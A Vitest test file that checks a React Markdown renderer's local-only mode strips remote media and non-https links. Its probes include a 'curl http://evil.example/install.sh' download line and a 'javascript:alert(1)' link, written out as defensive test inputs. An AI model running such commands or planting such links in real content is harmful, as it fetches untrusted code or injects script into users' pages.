import React from 'react';
import { describe, expect, it } from 'vitest';
import { render } from '@testing-library/react';
import MarkdownContent, { type MarkdownFeatureProfile } from './MarkdownContent';
import { MarkdownLinkRendererContext, type MarkdownLinkRenderer } from './markdownLinkRenderer';
import { isLocalOnlyHref } from './rehypeLocalOnly';

const LOCAL_ONLY: MarkdownFeatureProfile = { remoteMedia: false, httpsLinksOnly: true };
const MEDIA = 'img, picture, source, track, video, audio, iframe, frame, embed, object, image';

// Code blocks link URLs themselves, after the Markdown pipeline.
const CODE_PROBES = [
  '```\ncurl http://evil.example/install.sh https://ok.example/a\n```',
  '```bash\ncurl http://evil.example/install.sh https://ok.example/a\n```',
  '    curl http://evil.example/indented.sh https://ok.example/a',
];

// Ways Markdown and raw HTML can make a page load something or link off https.
const PROBES = [
  '`` ![x](http://t.example/a.png) `',
  '![a\nb](http://t.example/b.png)',
  // Not a fence: a backtick fence's info string cannot hold a backtick.
  '```x`y\n![c](http://t.example/c.png)',
  '[l](http://plain.example) <http://auto.example> http://bare.example www.www-autolink.example',
  '<a href="http://raw.example">r</a>',
  '[r][d]\n\n[d]: http://ref.example',
  '![ref image][pic]\n\n[pic]: https://t.example/ref.png',
  '<img src="https://t.example/raw.png" alt="raw alt">',
  '<p>before <img\nsrc="https://t.example/multiline.png"\nalt="multi"> after</p>',
  '<picture><source srcset="https://t.example/s.webp"><img src="https://t.example/p.png" alt="pic alt"></picture>',
  '<video src="https://t.example/v.mp4" poster="https://t.example/poster.png">video fallback</video>',
  '<audio src="https://t.example/a.mp3"></audio><iframe src="https://t.example/frame"></iframe>',
  '[js](javascript:alert(1)) [mail](mailto:a@b.example) [rel](./notes.md) [proto](//t.example/x)',
  '![https image](https://t.example/ok.png)',
  ...CODE_PROBES,
];

function renderLocalOnly(text: string) {
  return render(<MarkdownContent text={text} features={LOCAL_ONLY} />).container;
}

describe('MarkdownContent local-only features', () => {
  it.each(PROBES)('loads nothing and links only https: %s', (text) => {
    const container = renderLocalOnly(text);
    expect(container.querySelectorAll(MEDIA)).toHaveLength(0);
    for (const a of Array.from(container.querySelectorAll('a'))) {
      const href = a.getAttribute('href') ?? '';
      expect(href.startsWith('#') || /^https:\/\/[^/]/.test(href)).toBe(true);
    }
  });

  it('keeps alt text, link words and https links', () => {
    const container = renderLocalOnly('See ![lobby photo](http://t.example/a.png), [plain](http://plain.example) and [ok](https://ok.example/p).');
    expect(container.textContent).toContain('See lobby photo, plain and ok.');
    const links = Array.from(container.querySelectorAll('a')).map((a) => a.getAttribute('href'));
    expect(links).toEqual(['https://ok.example/p']);
  });

  it.each(CODE_PROBES)('keeps code text and its https links: %s', (text) => {
    const container = renderLocalOnly(text);
    expect(container.querySelector('code')?.textContent).toContain('curl http://evil.example/');
    expect(Array.from(container.querySelectorAll('code a')).map((a) => a.getAttribute('href'))).toEqual(['https://ok.example/a']);
  });

  it('keeps fallback words of embedded media', () => {
    const container = renderLocalOnly(PROBES[10]);
    expect(container.textContent).toContain('video fallback');
  });

  it('uses probes that do load media and link off https without the opt-in', () => {
    let media = 0;
    let offHttps = 0;
    for (const text of PROBES) {
      const { container, unmount } = render(<MarkdownContent text={text} />);
      media += container.querySelectorAll(MEDIA).length;
      offHttps += Array.from(container.querySelectorAll('a')).filter((a) => !isLocalOnlyHref(a.getAttribute('href'))).length;
      unmount();
    }
    expect(media).toBeGreaterThanOrEqual(6);
    expect(offHttps).toBeGreaterThanOrEqual(5);
  });

  it('changes nothing for callers that do not opt in', () => {
    const { container } = render(<MarkdownContent text="![x](https://t.example/a.png) [l](http://plain.example)" />);
    expect(container.querySelectorAll('img')).toHaveLength(1);
    expect(container.querySelector('a')?.getAttribute('href')).toBe('http://plain.example');
  });

  it('judges hrefs strictly', () => {
    expect(isLocalOnlyHref('https://a.example/x')).toBe(true);
    expect(isLocalOnlyHref(' #section ')).toBe(true);
    expect(isLocalOnlyHref('https://')).toBe(false);
    expect(isLocalOnlyHref('http://a.example')).toBe(false);
    expect(isLocalOnlyHref('//a.example')).toBe(false);
    expect(isLocalOnlyHref('mailto:a@b.example')).toBe(false);
    expect(isLocalOnlyHref(undefined)).toBe(false);
  });
});

describe('a link renderer without remote media', () => {
  const noMedia: MarkdownLinkRenderer = { protocols: [], matches: () => false, render: (_href, children) => children, remoteMedia: false };
  const withRenderer = (renderer: MarkdownLinkRenderer, text: string, features?: MarkdownFeatureProfile) => render(
    <MarkdownLinkRendererContext.Provider value={renderer}><MarkdownContent text={text} features={features} /></MarkdownLinkRendererContext.Provider>,
  ).container;

  it.each([undefined, { tableControls: true }, { remoteMedia: false, httpsImages: true }] as Array<MarkdownFeatureProfile | undefined>)(
    'loads nothing under it, whatever the caller’s features (%o)',
    (features) => {
      for (const text of PROBES) {
        expect(withRenderer(noMedia, text, features).querySelectorAll(MEDIA)).toHaveLength(0);
      }
      expect(withRenderer(noMedia, 'See ![lobby photo](https://t.example/a.png) <img src="https://t.example/r.png" alt="raw alt">', features).textContent)
        .toContain('See lobby photo raw alt');
    },
  );

  it('changes nothing for a renderer that does not say so', () => {
    const links: MarkdownLinkRenderer = { protocols: [], matches: () => false, render: (_href, children) => children };
    expect(withRenderer(links, '![x](https://t.example/a.png)').querySelectorAll('img')).toHaveLength(1);
  });
});
